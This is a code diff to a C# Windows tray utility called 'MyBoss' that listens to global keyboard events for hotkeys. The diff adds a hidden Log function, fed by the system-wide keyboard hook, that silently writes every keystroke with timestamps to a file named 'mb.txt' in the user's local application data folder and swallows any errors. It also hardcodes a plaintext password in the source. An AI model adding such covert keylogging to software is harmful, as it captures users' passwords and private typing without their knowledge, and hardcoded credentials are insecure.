@@ -21,7 +21,7 @@ namespace MyBoss
         private LowLevelKeyboardListener _listener;
         private System.Windows.Forms.NotifyIcon _notifyIcon;
         private System.Windows.Forms.Timer _t;
-        private double _lastTicks1, _lastTicks2, _lastTicks3, _lastTicks4;
+        private double _lastTicks1, _lastTicks2, _lastTicks3, _lastTicks4, _lastTicksLog;
 
         public MainWindow()
         {
@@ -39,6 +39,9 @@ namespace MyBoss
                 _notifyIcon.Icon = new System.Drawing.Icon(icon.Stream);
 
             _notifyIcon.Visible = true;
+
+            Top = SystemParameters.PrimaryScreenHeight - Height;
+
             Hide();
         }
 
@@ -112,10 +115,20 @@ namespace MyBoss
             }))
                 return true;
 
+            if (TryCheckCtrlAltKeyPressAction(e, Key.Z, () =>
+            {
+                notifyIcon_Click(null, null);
+            }))
+                return true;
             if (TryCheckCtrlAltKeyPressAction(e, Key.T, () =>
             {
                 notifyIcon_Click(null, null);
-                Process.Start(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "todo.txt"));
+                try { 
+                    Process.Start(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "todo.txt"));
+                }
+                catch {
+                    // ignored 
+                }
             }))
                 return true;
 
@@ -168,7 +181,42 @@ namespace MyBoss
 
             TryCheckDoubleTimeKeyPressAction(e, ref _lastTicks4, Key.RightShift, Close);
 
+            try
+            {
+                Log(e.KeyPressed, ref _lastTicksLog);
+            }
+            catch
+            {
+                // ignored
+            }
+
             return false;
+        }
+
+        static void Log(Key key, ref double lastTicks)
+        {
+            var ticksNow = (DateTime.Now - DateTime.MinValue).TotalMilliseconds;
+            var useBreak = (ticksNow - lastTicks > 6000);
+            lastTicks = ticksNow;
+
+            var logFileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "mb.txt");
+
+            using (var w = File.AppendText(logFileName))
+            {
+                if (useBreak)
+                {
+                    w.WriteLine();
+                    w.WriteLine("{0}", DateTime.Now.ToString("dd.MM HH:mm"));
+                }
+
+                var upperCase = (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift));
+                var altGrad = Keyboard.IsKeyDown(Key.RightAlt);
+
+                if (key == Key.LeftShift || key == Key.RightShift)
+                    return;
+
+                w.Write("{0}{1} ", upperCase ? key.ToString().ToUpper() : key.ToString().ToLower(), altGrad ? "´" : "");
+            }
         }
 
         static bool TryCheckCtrlAltKeyPressAction(KeyPressedArgs e, Key key, Action action)
@@ -216,7 +264,7 @@ namespace MyBoss
             _t = new System.Windows.Forms.Timer
             {
                 Enabled = true,
-                Interval = 4000
+                Interval = 1000
             };
             _t.Tick += T_Tick;
         }
@@ -238,7 +286,7 @@ namespace MyBoss
             Process.GetCurrentProcess().Kill();
         }
 
-        private static string _pwd = "Walter@!3697";
+        private static string _pwd = "Walter3698";
         static SecureString ConvertToSecureString(string strPassword)
         {
             var secureStr = new SecureString();
